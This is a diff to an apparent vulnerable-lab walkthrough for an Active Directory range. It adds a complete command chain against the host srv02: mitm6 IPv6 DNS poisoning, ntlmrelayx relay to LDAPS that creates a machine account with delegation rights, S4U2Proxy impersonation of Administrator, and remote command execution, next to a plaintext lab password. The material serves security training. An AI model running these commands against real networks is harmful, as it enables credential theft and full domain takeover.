@@ -147,14 +147,30 @@ nxc smb 192.168.100.20 -u walter.white -p "774azeG!" -x 'gpupdate /force'
 **Target:** srv02 | **What:** IPv6 is enabled; an attacker can run a rogue DHCPv6 server to MITM traffic and relay credentials.
 
 ```bash
-# Trigger: reboot srv02 to generate DHCPv6 requests
-./lab.sh vuln trigger 5
-
-# Run mitm6 to become the IPv6 DNS server
+# Terminal 1: Run mitm6 to become the IPv6 DNS server
 mitm6 -d breakingbad.local -i eth0
 
-# Combine with ntlmrelayx to relay captured auth
+# Terminal 2: Relay captured auth to LDAPS on DC (creates a machine account for RBCD)
+ntlmrelayx.py -6 -t ldaps://192.168.100.10 -wh fake.breakingbad.local -l loot --delegate-access
+
+# Terminal 3: Trigger DHCPv6 by rebooting srv02
+./lab.sh vuln trigger 5
+
+# mitm6 poisons DNS -> srv02 authenticates to us -> ntlmrelayx relays to LDAPS
+# ntlmrelayx creates a machine account (e.g. YOURMACHINE$) with RBCD rights on srv02
+
+# Use the created machine account for S4U2Proxy to impersonate admin on srv02
+getST.py breakingbad.local/'YOURMACHINE$':'PASSWORD' -spn cifs/srv02.breakingbad.local \
+  -impersonate Administrator -dc-ip 192.168.100.10
+
+# Use the ticket
+export KRB5CCNAME=Administrator@cifs_srv02.breakingbad.local@BREAKINGBAD.LOCAL.ccache
+nxc smb srv02.breakingbad.local -k --use-kcache -x 'whoami'
+
+# Alternative: relay to LDAPS without --delegate-access to dump domain info
 ntlmrelayx.py -6 -t ldaps://192.168.100.10 -wh fake.breakingbad.local -l loot
+# Check loot/ directory for dumped users, groups, computers, and domain info
+ls loot/
 ```
 
 ---
